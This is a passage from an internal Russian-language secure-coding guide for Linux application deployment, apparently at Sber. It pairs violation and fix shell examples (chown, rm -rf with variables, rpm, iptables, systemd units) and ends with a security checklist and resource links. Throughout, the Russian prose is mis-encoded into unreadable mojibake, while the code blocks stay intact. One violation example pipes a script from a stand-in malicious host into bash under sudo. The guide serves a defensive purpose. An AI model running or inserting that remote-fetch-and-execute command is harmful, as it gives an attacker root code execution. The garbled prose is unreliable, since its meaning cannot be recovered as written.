### 5. –ù–µ–±–µ–∑–æ–ø–∞—Å–Ω—ã–µ –∞—Ä–≥—É–º–µ–Ω—Ç—ã –≤ –∫–æ–º–∞–Ω–¥–µ chown

**‚ùå –ù–∞—Ä—É—à–µ–Ω–∏–µ:**
```bash
chown --reference=/opt/vault/conf /opt/vault/certs
chown harvest:harvest /opt/harvest/cert
```

**–ü—Ä–æ–±–ª–µ–º–∞:**
- `--reference` –º–æ–∂–µ—Ç –∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤–ª–∞–¥–µ–ª—å—Ü–∞ —Å —Å–∏—Å—Ç–µ–º–Ω—ã—Ö —Ñ–∞–π–ª–æ–≤
- –ò–∑–º–µ–Ω–µ–Ω–∏–µ –≤–ª–∞–¥–µ–ª—å—Ü–∞ —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –∫–∞—Ç–∞–ª–æ–≥–æ–≤

**‚úÖ –ò—Å–ø—Ä–∞–≤–ª–µ–Ω–∏–µ:**
```bash
# –Ø–≤–Ω—ã–µ –≤–ª–∞–¥–µ–ª–µ—Ü –∏ –≥—Ä—É–ø–ø–∞, –ø—Ä–∏–∫–ª–∞–¥–Ω—ã–µ –∫–∞—Ç–∞–ª–æ–≥–∏:
chown myapp_sys:myapp_sys /opt/myapp/certs
```

---

### 6. –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –¥–∏–Ω–∞–º–∏—á–µ—Å–∫–∏—Ö –ø–µ—Ä–µ–º–µ–Ω–Ω—ã—Ö –≤ –¥–µ—Å—Ç—Ä—É–∫—Ç–∏–≤–Ω—ã—Ö –∫–æ–º–∞–Ω–¥–∞—Ö

**‚ùå –ù–∞—Ä—É—à–µ–Ω–∏–µ:**
```bash
rm -rf "$file" || true
rm -rf "$LOCAL_CRED_JSON" "/home/${SUDO_USER:-}/temp_data_cred.json"
```

**–ü—Ä–æ–±–ª–µ–º–∞:** –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –¥–∏–Ω–∞–º–∏—á–µ—Å–∫–∏—Ö –ø–µ—Ä–µ–º–µ–Ω–Ω—ã—Ö –≤ –ø–æ—Ç–µ–Ω—Ü–∏–∞–ª—å–Ω–æ –æ–ø–∞—Å–Ω–æ–π –∫–æ–º–∞–Ω–¥–µ –º–æ–∂–µ—Ç –ø—Ä–∏–≤–µ—Å—Ç–∏ –∫ –Ω–µ–∂–µ–ª–∞—Ç–µ–ª—å–Ω–æ–π —ç—Å–∫–∞–ª–∞—Ü–∏–∏ –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π.

**‚úÖ –ò—Å–ø—Ä–∞–≤–ª–µ–Ω–∏–µ:**
```bash
# –Ø–≤–Ω—ã–µ –ø—É—Ç–∏ –±–µ–∑ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã—Ö:
rm -rf /opt/myapp/temp/file1.txt
rm -rf /opt/myapp/temp/file2.json

# –ò–ª–∏ –≤–∞–ª–∏–¥–∞—Ü–∏—è –ø–µ—Ä–µ–º–µ–Ω–Ω—ã—Ö:
if [[ "$file" =~ ^/opt/myapp/temp/ ]]; then
    rm -rf "$file"
fi
```

---

### 7. –ù–µ–±–µ–∑–æ–ø–∞—Å–Ω—ã–µ –∞—Ä–≥—É–º–µ–Ω—Ç—ã –≤ –∫–æ–º–∞–Ω–¥–µ rpm

**‚ùå –ù–∞—Ä—É—à–µ–Ω–∏–µ:**
```bash
rpm -e "$package" --nodeps
```

**–ü—Ä–æ–±–ª–µ–º–∞:**
- `--nodeps` –∏–≥–Ω–æ—Ä–∏—Ä—É–µ—Ç –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ ‚Üí –º–æ–∂–µ—Ç —Å–ª–æ–º–∞—Ç—å —Å–∏—Å—Ç–µ–º—É
- –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã—Ö ‚Üí –ø–æ–¥–º–µ–Ω–∞ –ø–∞–∫–µ—Ç–∞

**‚úÖ –ò—Å–ø—Ä–∞–≤–ª–µ–Ω–∏–µ:**
```bash
# –Ø–≤–Ω–æ–µ –∏–º—è –ø–∞–∫–µ—Ç–∞, –±–µ–∑ --nodeps:
rpm -e myapp-1.0.0

# –ò–ª–∏ —á–µ—Ä–µ–∑ yum/dnf (—É–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç—è–º–∏):
yum remove myapp
```

---

### 8. –ü–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –≤ —Å–∏—Å—Ç–µ–º–Ω—ã–µ —Ñ–∞–π–ª—ã

**‚ùå –ù–∞—Ä—É—à–µ–Ω–∏–µ:**
```bash
cat > /etc/profile.d/myapp.sh << 'EOF'
export PATH=$PATH:/opt/myapp/bin
EOF

iptables-save > /etc/sysconfig/iptables
```

**–ü—Ä–æ–±–ª–µ–º–∞:** –ü–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –≤ —Å–∏—Å—Ç–µ–º–Ω—ã–π —Ñ–∞–π–ª –ø–æ–∑–≤–æ–ª—è–µ—Ç –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫—É —É–¥–∞–ª–∏—Ç—å –≤–∞–∂–Ω—ã–π —Å–∏—Å—Ç–µ–º–Ω—ã–π —Ñ–∞–π–ª –∏–ª–∏ –ø–µ—Ä–µ–ø–∏—Å–∞—Ç—å –µ–≥–æ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–º —Å–æ–¥–µ—Ä–∂–∏–º—ã–º.

**‚úÖ –ò—Å–ø—Ä–∞–≤–ª–µ–Ω–∏–µ:**
```bash
# –ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏–µ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–æ–Ω–Ω—ã–µ —Ñ–∞–π–ª—ã:
cat > $HOME/.bashrc << 'EOF'
export PATH=$PATH:/opt/myapp/bin
EOF

# –î–ª—è iptables - —á–µ—Ä–µ–∑ RLM –∏–ª–∏ —è–≤–Ω—ã–µ –ø—Ä–∞–≤–∞ –≤ sudoers
```

---

### 9. –ü–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –≤ —Ñ–∞–π–ª –±–µ–∑ –∞–±—Å–æ–ª—é—Ç–Ω–æ–≥–æ –ø—É—Ç–∏

**‚ùå –ù–∞—Ä—É—à–µ–Ω–∏–µ:**
```bash
echo "config" > config.conf
cat > myapp.conf << 'EOF'
```

**–ü—Ä–æ–±–ª–µ–º–∞:** –ü–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –≤ —Ñ–∞–π–ª –±–µ–∑ —É–∫–∞–∑–∞–Ω–∏—è –∞–±—Å–æ–ª—é—Ç–Ω–æ–≥–æ –ø—É—Ç–∏ –ø–æ–∑–≤–æ–ª—è–µ—Ç –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫—É –∑–∞–ø–∏—Å–∞—Ç—å –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—É—é –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—é –≤ —Å–∏—Å—Ç–µ–º–Ω—ã–π —Ñ–∞–π–ª –∏ –ø–æ–ª—É—á–∏—Ç—å –∫–æ–Ω—Ç—Ä–æ–ª—å –Ω–∞–¥ —Å–∏—Å—Ç–µ–º–æ–π.

**‚úÖ –ò—Å–ø—Ä–∞–≤–ª–µ–Ω–∏–µ:**
```bash
# –í—Å–µ–≥–¥–∞ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –∞–±—Å–æ–ª—é—Ç–Ω—ã–µ –ø—É—Ç–∏:
echo "config" > /opt/myapp/config/config.conf
cat > /opt/myapp/config/myapp.conf << 'EOF'
```

---

### 10. –§–∞–π–ª—ã –≤ –∑–∞–ø—Ä–µ—â–µ–Ω–Ω—ã—Ö –∫–∞—Ç–∞–ª–æ–≥–∞—Ö

**‚ùå –ù–∞—Ä—É—à–µ–Ω–∏–µ:**
```bash
# –†–∞–∑–º–µ—â–µ–Ω–∏–µ —Ñ–∞–π–ª–æ–≤ –≤ /usr/local/bin
ln -s /opt/harvest/bin/harvest /usr/local/bin/harvest

# –ò–∑–º–µ–Ω–µ–Ω–∏–µ PATH –¥–ª—è –≤–∫–ª—é—á–µ–Ω–∏—è /usr/local/bin
export PATH=$PATH:/usr/local/bin:/opt/harvest/bin
```

**–ü—Ä–æ–±–ª–µ–º–∞:** –û–±–Ω–∞—Ä—É–∂–µ–Ω —Ñ–∞–π–ª –≤ –∫–∞—Ç–∞–ª–æ–≥–µ, –∑–∞–ø—Ä–µ—â–µ–Ω–Ω–æ–º –¥–ª—è —Ä–∞–∑–º–µ—â–µ–Ω–∏—è —Ñ–∞–π–ª–æ–≤.

**‚úÖ –ò—Å–ø—Ä–∞–≤–ª–µ–Ω–∏–µ:**
```bash
# –ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏–µ –∫–∞—Ç–∞–ª–æ–≥–∏:
ln -s /opt/harvest/bin/harvest $HOME/.local/bin/harvest
export PATH=$PATH:$HOME/.local/bin:/opt/harvest/bin
```

---

### 11. –ù–µ–∫–æ–Ω—Ç—Ä–æ–ª–∏—Ä—É–µ–º—ã–µ –º–∞–Ω–∏–ø—É–ª—è—Ü–∏–∏ —Å systemd units

**‚ùå –ù–∞—Ä—É—à–µ–Ω–∏–µ:**
```bash
cat > /etc/systemd/system/myapp.service << 'EOF'
[Unit]
Description=My App

[Service]
ExecStart=/opt/myapp/bin/myapp
EOF

systemctl daemon-reload
systemctl enable myapp
```

**–ü—Ä–æ–±–ª–µ–º–∞:** –ù–µ–∫–æ–Ω—Ç—Ä–æ–ª–∏—Ä—É–µ–º—ã–µ –º–∞–Ω–∏–ø—É–ª—è—Ü–∏–∏ —Å —Ñ–∞–π–ª–∞–º–∏ –≤ `/etc/systemd/system` –º–æ–≥—É—Ç –ø—Ä–∏–≤–µ—Å—Ç–∏ –∫ –ø–æ–≤—ã—à–µ–Ω–∏—é –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π.

**‚úÖ –ò—Å–ø—Ä–∞–≤–ª–µ–Ω–∏–µ:**
```bash
# –ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å User Systemd Units:
mkdir -p $HOME/.config/systemd/user
cat > $HOME/.config/systemd/user/myapp.service << 'EOF'
[Unit]
Description=My App

[Service]
ExecStart=/opt/myapp/bin/myapp
EOF

systemctl --user daemon-reload
systemctl --user enable myapp
```

**–ò–ª–∏** —Å–æ–∑–¥–∞—Ç—å RPM-–ø–∞–∫–µ—Ç –∏ —è–≤–Ω–æ –ø–æ–ª–æ–∂–∏—Ç—å —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ unit –≤ –ø–∞–∫–µ—Ç.

---

### 12. –ù–µ–±–µ–∑–æ–ø–∞—Å–Ω—ã–µ –∞—Ä–≥—É–º–µ–Ω—Ç—ã –≤ –∫–æ–º–∞–Ω–¥–µ iptables

**‚ùå –ù–∞—Ä—É—à–µ–Ω–∏–µ:**
```bash
iptables -I INPUT 1 -p tcp -s 127.0.0.1 --dport "$PROMETHEUS_PORT" -j ACCEPT
iptables -A INPUT -p tcp --dport "$port" -j ACCEPT
ip6tables -I INPUT 1 -p tcp -s ::1 --dport "$PROMETHEUS_PORT" -j ACCEPT
```

**–ü—Ä–æ–±–ª–µ–º–∞:**
- –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –¥–∏–Ω–∞–º–∏—á–µ—Å–∫–∏—Ö –ø–µ—Ä–µ–º–µ–Ω–Ω—ã—Ö ‚Üí –≤–æ–∑–º–æ–∂–Ω–∞ —ç—Å–∫–∞–ª–∞—Ü–∏—è –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π
- –ü—Ä—è–º–æ–µ –∏–∑–º–µ–Ω–µ–Ω–∏–µ iptables —Ç—Ä–µ–±—É–µ—Ç root

**‚úÖ –ò—Å–ø—Ä–∞–≤–ª–µ–Ω–∏–µ:**
```bash
# –Ø–≤–Ω—ã–µ –ø–æ—Ä—Ç—ã:
iptables -I INPUT 1 -p tcp -s 127.0.0.1 --dport 9090 -j ACCEPT

# –ò–ª–∏ —á–µ—Ä–µ–∑ RLM/–∑–∞—è–≤–∫—É –≤ SberInfra –¥–ª—è –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ firewall
```

---

### 13. –ó–∞–ø—É—Å–∫ –ª–æ–∫–∞–ª—å–Ω–æ–π –∫–æ–º–∞–Ω–¥—ã –∏–∑ —Å–∫—Ä–∏–ø—Ç–∞ —Å –ø—Ä–∞–≤–∞–º–∏ root

**‚ùå –ù–∞—Ä—É—à–µ–Ω–∏–µ:**
```bash
#!/bin/bash
# –≠—Ç–æ—Ç —Å–∫—Ä–∏–ø—Ç –∑–∞–ø—É—Å–∫–∞–µ—Ç—Å—è —á–µ—Ä–µ–∑ sudo
curl https://malicious-site.com/script.sh | bash
```

**–ü—Ä–æ–±–ª–µ–º–∞:** –ó–∞–ø—É—Å–∫ –ª–æ–∫–∞–ª—å–Ω–æ–π –∫–æ–º–∞–Ω–¥—ã –∏–∑ —Å–∫—Ä–∏–ø—Ç–∞, –∑–∞–ø—É—Å–∫–∞–µ–º–æ–≥–æ –∫–æ–º–∞–Ω–¥–æ–π root, –Ω–µ–±–µ–∑–æ–ø–∞—Å–µ–Ω. –≠—Ç–æ –ø–æ–∑–≤–æ–ª—è–µ—Ç –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫—É —Ñ–∞–∫—Ç–∏—á–µ—Å–∫–∏ –∑–∞–ø—É—Å—Ç–∏—Ç—å –ª—é–±–æ–π —Å–∫—Ä–∏–ø—Ç —Å –ø—Ä–∞–≤–∞–º–∏ root.

**‚úÖ –ò—Å–ø—Ä–∞–≤–ª–µ–Ω–∏–µ:**
```bash
# –ù–ï –∑–∞–≥—Ä—É–∂–∞—Ç—å –∏ –≤—ã–ø–æ–ª–Ω—è—Ç—å —Å–∫—Ä–∏–ø—Ç—ã –∏–∑ —Å–µ—Ç–∏ —Å –ø—Ä–∞–≤–∞–º–∏ root
# –ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –ø—Ä–æ–≤–µ—Ä–µ–Ω–Ω—ã–µ –∏—Å—Ç–æ—á–Ω–∏–∫–∏ (—Ä–µ–ø–æ–∑–∏—Ç–æ—Ä–∏–∏ –î–ò, RLM)
```

---

### 14. –ò–∑–º–µ–Ω–µ–Ω–∏–µ –ø—Ä–∞–≤ –Ω–∞ —Ñ–∞–π–ª—ã, —É–ø—Ä–∞–≤–ª—è–µ–º—ã–µ –ø–∞–∫–µ—Ç–Ω—ã–º –º–µ–Ω–µ–¥–∂–µ—Ä–æ–º

**‚ùå –ù–∞—Ä—É—à–µ–Ω–∏–µ:**
```bash
chown root:grafana /etc/grafana/grafana.ini
chmod 640 /etc/grafana/grafana.ini
rm -rf /etc/prometheus/prometheus.yml
```

**–ü—Ä–æ–±–ª–µ–º–∞:** –ó–∞–ø—Ä–µ—â–µ–Ω–æ –∏–∑–º–µ–Ω–µ–Ω–∏–µ –ø—Ä–∞–≤ –Ω–∞ —Ñ–∞–π–ª—ã –∏ –∫–∞—Ç–∞–ª–æ–≥–∏, –∫–æ—Ç–æ—Ä—ã–µ —É–ø—Ä–∞–≤–ª—è—é—Ç—Å—è –ø–∞–∫–µ—Ç–Ω—ã–º –º–µ–Ω–µ–¥–∂–µ—Ä–æ–º.

**‚úÖ –ò—Å–ø—Ä–∞–≤–ª–µ–Ω–∏–µ:**
```bash
# –ö–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –ø—Ä–∏–∫–ª–∞–¥–Ω–æ–π –∫–∞—Ç–∞–ª–æ–≥:
cp /etc/grafana/grafana.ini /opt/myapp/config/grafana.ini
chown myapp_sys:myapp_sys /opt/myapp/config/grafana.ini
chmod 640 /opt/myapp/config/grafana.ini

# –£–∫–∞–∑–∞—Ç—å –ø—É—Ç—å –ø—Ä–∏ –∑–∞–ø—É—Å–∫–µ:
grafana-server --config /opt/myapp/config/grafana.ini
```

---

## ‚úÖ –ß–µ–∫–ª–∏—Å—Ç –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏

### –ü–µ—Ä–µ–¥ —Ä–∞–∑–≤–µ—Ä—Ç—ã–≤–∞–Ω–∏–µ–º

- [ ] **–ü–û —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ –∏–∑ –ø–æ—Ä—Ç–∞–ª–∞ –î–ò** (–Ω–µ —Å–∞–º–æ—Å—Ç–æ—è—Ç–µ–ª—å–Ω–∞—è —Å–±–æ—Ä–∫–∞)
- [ ] **–°–æ–∑–¥–∞–Ω—ã 4 –£–ó –≤ IDM**: –°–£–ó (NoLogin), –ü–£–ó, –¢–£–ó, ReadOnly
- [ ] **–°–æ–∑–¥–∞–Ω–∞ –æ—Ç–¥–µ–ª—å–Ω–∞—è –§–°** —á–µ—Ä–µ–∑ RLM –¥–ª—è –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è
- [ ] **–†–∞–∑–¥–µ–ª–µ–Ω—ã –∫–∞—Ç–∞–ª–æ–≥–∏**: `bin/`, `config/`, `data/`, `logs/`
- [ ] **–ù–∞–∑–Ω–∞—á–µ–Ω—ã –ø—Ä–∞–≤–∏–ª—å–Ω—ã–µ –≤–ª–∞–¥–µ–ª—å—Ü—ã –∏ –ø—Ä–∞–≤–∞** –Ω–∞ –∫–∞–∂–¥—ã–π –∫–∞—Ç–∞–ª–æ–≥
- [ ] **Sudoers –ø—Ä–∞–≤–∏–ª–∞ —Å–æ–∑–¥–∞–Ω—ã** —Å —è–≤–Ω—ã–º–∏ –∫–æ–º–∞–Ω–¥–∞–º–∏ –±–µ–∑ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã—Ö
- [ ] **Sudoers –ø—Ä–∞–≤–∏–ª–∞ —Ä–∞–∑–≤–µ—Ä–Ω—É—Ç—ã** —á–µ—Ä–µ–∑ IDM
- [ ] **User Systemd Units —Å–æ–∑–¥–∞–Ω—ã** –≤ `$HOME/.config/systemd/user/`
- [ ] **–°–µ–∫—Ä–µ—Ç—ã —Ö—Ä–∞–Ω—è—Ç—Å—è –≤ SecMan (Vault)**, –Ω–µ –≤ —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä–∏–∏
- [ ] **–í—Ä–µ–º–µ–Ω–Ω—ã–µ —Å–µ–∫—Ä–µ—Ç—ã —Ä–∞–∑–º–µ—â–∞—é—Ç—Å—è** –≤ `/dev/shm` —Å –ø—Ä–∞–≤–∞–º–∏ 700

---

### –ü—Ä–æ–≤–µ—Ä–∫–∞ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏

- [ ] **–ù–ï –∏—Å–ø–æ–ª—å–∑—É—é—Ç—Å—è —Å–∏—Å—Ç–µ–º–Ω—ã–µ –∫–∞—Ç–∞–ª–æ–≥–∏** (`/usr`, `/var`, `/etc`, `/mnt`)
- [ ] **–ù–ï –∏–∑–º–µ–Ω—è—é—Ç—Å—è —Ñ–∞–π–ª—ã, —É–ø—Ä–∞–≤–ª—è–µ–º—ã–µ –ø–∞–∫–µ—Ç–Ω—ã–º –º–µ–Ω–µ–¥–∂–µ—Ä–æ–º**
- [ ] **–ù–ï –∏—Å–ø–æ–ª—å–∑—É—é—Ç—Å—è —à–∏—Ä–æ–∫–∏–µ sudo –ø—Ä–∞–≤–∞** (`ALL`, `*`, bash/sh)
- [ ] **–ù–ï –∏—Å–ø–æ–ª—å–∑—É—é—Ç—Å—è –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ –≤ sudoers**
- [ ] **–ù–ï –∏—Å–ø–æ–ª—å–∑—É—é—Ç—Å—è –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ –≤ –¥–µ—Å—Ç—Ä—É–∫—Ç–∏–≤–Ω—ã—Ö –∫–æ–º–∞–Ω–¥–∞—Ö** (`rm`, `chown`, `chmod`)
- [ ] **–ù–ï –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è `su`, `sg`, `newgrp`** (—Ç–æ–ª—å–∫–æ `sudo -u`)
- [ ] **–ù–ï –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è `chmod 777` –∏–ª–∏ `o+rw`**
- [ ] **–ù–ï —Ä–∞–∑–º–µ—â–∞—é—Ç—Å—è —Ñ–∞–π–ª—ã –≤ `/tmp`** (–∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å `/dev/shm` –¥–ª—è —Å–µ–∫—Ä–µ—Ç–æ–≤)
- [ ] **–ù–ï –ª–æ–≥–∏—Ä—É—é—Ç—Å—è —Å–µ–∫—Ä–µ—Ç—ã** (–ø–∞—Ä–æ–ª–∏, —Ç–æ–∫–µ–Ω—ã, –∫–ª—é—á–∏)
- [ ] **–ù–ï —Ö–∞—Ä–¥–∫–æ–¥—è—Ç—Å—è —Å–µ–∫—Ä–µ—Ç—ã** –≤ –∫–æ–¥–µ –∏–ª–∏ –∫–æ–Ω—Ñ–∏–≥–∞—Ö

---

### Audit –∏ –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥

- [ ] **–í—Å–µ sudo –∫–æ–º–∞–Ω–¥—ã –ª–æ–≥–∏—Ä—É—é—Ç—Å—è** (audit trail)
- [ ] **–õ–æ–≥–∏ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è –æ—Ç–¥–µ–ª–µ–Ω—ã** –æ—Ç —Å–∏—Å—Ç–µ–º–Ω—ã—Ö (User Journald)
- [ ] **–ù–∞—Å—Ç—Ä–æ–µ–Ω–∞ —Ä–æ—Ç–∞—Ü–∏—è –ª–æ–≥–æ–≤** (logrotate –≤ –ø—Ä–æ—Å—Ç—Ä–∞–Ω—Å—Ç–≤–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è)
- [ ] **–ú–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥ –ø—Ä–∞–≤ –¥–æ—Å—Ç—É–ø–∞** (—Ä–µ–≥—É–ª—è—Ä–Ω–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ –≤–ª–∞–¥–µ–ª—å—Ü–µ–≤/–ø—Ä–∞–≤)
- [ ] **–ú–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥ sudo –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è** (–∫—Ç–æ, –∫–æ–≥–¥–∞, –∫–∞–∫–∏–µ –∫–æ–º–∞–Ω–¥—ã)

---

### –î–æ–∫—É–º–µ–Ω—Ç–∞—Ü–∏—è

- [ ] **–°–æ–∑–¥–∞–Ω–∞ –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü–∏—è –ø–æ –∞—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä–µ** (—Ä–∞–∑–¥–µ–ª–µ–Ω–∏–µ –ø–æ–ª–Ω–æ–º–æ—á–∏–π)
- [ ] **–°–æ–∑–¥–∞–Ω–∞ –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—è –ø–æ —Ä–∞–∑–≤–µ—Ä—Ç—ã–≤–∞–Ω–∏—é** –¥–ª—è –Ω–æ–≤—ã—Ö —Å–µ—Ä–≤–µ—Ä–æ–≤
- [ ] **–°–æ–∑–¥–∞–Ω —Å–ø–∏—Å–æ–∫ sudoers –ø—Ä–∞–≤–∏–ª** –¥–ª—è –∫–∞–∂–¥–æ–π –£–ó
- [ ] **–°–æ–∑–¥–∞–Ω–∞ –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—è –ø–æ —Ä–∞–±–æ—Ç–µ —Å —Å–µ–∫—Ä–µ—Ç–∞–º–∏** (Vault)
- [ ] **–°–æ–∑–¥–∞–Ω runbook** –¥–ª—è —Ç–∏–ø–æ–≤—ã—Ö –æ–ø–µ—Ä–∞—Ü–∏–π (restart, backup, recovery)

---

## üìö –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ —Ä–µ—Å—É—Ä—Å—ã

### –í–Ω—É—Ç—Ä–µ–Ω–Ω–∏–µ —Ä–µ—Å—É—Ä—Å—ã –°–±–µ—Ä

- **–ü–æ—Ä—Ç–∞–ª –î–ò (–î–∏—Ä–µ–∫—Ç–æ—Ä–∏—è –ò–Ω—Ñ—Ä–∞—Å—Ç—Ä—É–∫—Ç—É—Ä—ã):** [internal-link]
- **RLM (Resource Lifecycle Management):** https://rlm.sigma.sbrf.ru/dashboard/directions/RLM_UVS
- **IDM (Identity Management):** [internal-link]
- **SecMan (Vault):** [internal-link]
- **Confluence (–¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü–∏—è):** https://confluence.sberbank.ru/

### –†—É–∫–æ–≤–æ–¥—Å—Ç–≤–∞ –∏ –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–∏

- [–£—Å—Ç–∞–Ω–æ–≤–∫–∞ –ü–û –∏–∑ –§–ü–î –Ω–∞ Linux —Å –ø–æ–º–æ—â—å—é —Å—Ü–µ–Ω–∞—Ä–∏—è RLM]
- [–ò–Ω—Å—Ç—Ä—É–∫—Ü–∏—è –ø–æ —Ä–∞–±–æ—Ç–µ —Å –£–ó Linux (IDM)]
- [–ö–∞–∫ —Å–æ–∑–¥–∞—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏–π —Å–µ—Ä–≤–∏—Å systemd –¥–ª—è —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ (nologin) –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è?]
- [–û—Ç–ø—Ä–∞–≤–∫–∞ –ª–æ–≥–æ–≤ –ø–æ —Å–µ—Ç–∏ —Å –ø–æ–º–æ—â—å—é rsyslogd –±–µ–∑ –ø—Ä–∞–≤ root]
- [–ò–Ω—Å—Ç—Ä—É–∫—Ü–∏—è –ø–æ —Å–±–æ—Ä–∫–µ —Å–æ–±—Å—Ç–≤–µ–Ω–Ω–æ–≥–æ RPM-–ø–∞–∫–µ—Ç–∞ –∏ –µ–≥–æ —É—Å—Ç–∞–Ω–æ–≤–∫–µ —á–µ—Ä–µ–∑ RLM]
- [–ü—Ä–∞–≤–∏–ª–∞ –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª–µ–Ω–∏—è –ø—Ä–∞–≤ sudo]
- [–°–∫—Ä–∏–ø—Ç—ã —Å–∞–º–æ–æ–±—Å–ª—É–∂–∏–≤–∞–Ω–∏—è –¥–ª—è –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–æ–≤ –ê–°]

### –í–∏–¥–µ–æ –∏ —Å—Ç—Ä–∏–º—ã

- **117 —Å—Ç—Ä–∏–º –ú–µ—Ç–ª–∞:** –ü–æ–¥—Ä–æ–±–Ω—ã–µ —Ç—Ä–µ–±–æ–≤–∞–Ω–∏—è –ø–æ —Ä–∞–∑–¥–µ–ª–µ–Ω–∏—é –ø–æ–ª–Ω–æ–º–æ—á–∏–π
- **–ü—Ä–∏–º–µ—Ä —Ä–∞–∑–¥–µ–ª–µ–Ω–∏—è –ø–æ–ª–Ω–æ–º–æ—á–∏–π:** https://confluence.sberbank.ru/pages/viewpage.action?pageId=19473678382

---

## üìù –ò—Å—Ç–æ—Ä–∏—è –∏–∑–º–µ–Ω–µ–Ω–∏–π

| –í–µ—Ä—Å–∏—è | –î–∞—Ç–∞ | –û–ø–∏—Å–∞–Ω–∏–µ –∏–∑–º–µ–Ω–µ–Ω–∏–π |
|--------|------|-------------------|
| 1.0 | November 19, 2024 | –ü–µ—Ä–≤–æ–Ω–∞—á–∞–ª—å–Ω–∞—è –≤–µ—Ä—Å–∏—è –¥–æ–∫—É–º–µ–Ω—Ç–∞ |

---

## üí¨ –†–µ–∞–ª—å–Ω—ã–µ –∑–∞–º–µ—á–∞–Ω–∏—è –∫–∏–±–µ—Ä–±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –∏ —Ä–µ—à–µ–Ω–∏—è

> **–ò—Å—Ç–æ—á–Ω–∏–∫:** –î–∏–∞–ª–æ–≥ –ø–æ –∑–∞—è–≤–∫–µ IDM ‚Ññ25/297950 –∏ ‚Ññ25/341016  
> **–î–∞—Ç–∞:** November 2024

–≠—Ç–æ—Ç —Ä–∞–∑–¥–µ–ª —Å–æ–¥–µ—Ä–∂–∏—Ç —Ä–µ–∞–ª—å–Ω—ã–µ –∑–∞–º–µ—á–∞–Ω–∏—è –æ—Ç —Å–ª—É–∂–±—ã –∫–∏–±–µ—Ä–±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –∏ –ø—Ä–µ–¥–ª–æ–∂–µ–Ω–Ω—ã–µ —Ä–µ—à–µ–Ω–∏—è –¥–ª—è —Å–ø—Ä–∞–≤–∫–∏ –ø—Ä–∏ –±—É–¥—É—â–∏—Ö –∞—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä–Ω—ã—Ö —Ä–µ—à–µ–Ω–∏—è—Ö.

---

